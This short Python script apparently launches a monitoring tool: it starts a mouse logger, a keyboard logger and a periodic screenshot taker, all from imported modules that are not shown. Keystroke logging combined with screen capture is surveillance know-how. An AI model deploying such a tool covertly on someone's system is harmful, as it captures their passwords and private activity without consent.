from mouse_logger import MouseLogger
from keyboard_logger import KeyboardLogger
from screenshot_taker import ScreenshotTaker
from constants import TIME_INTERVAL




mouseLogger = MouseLogger(TIME_INTERVAL)
keyLogger =  KeyboardLogger(TIME_INTERVAL)
screenshotTaker = ScreenshotTaker(TIME_INTERVAL)

mouseLogger.start()
keyLogger.start()
screenshotTaker.start()
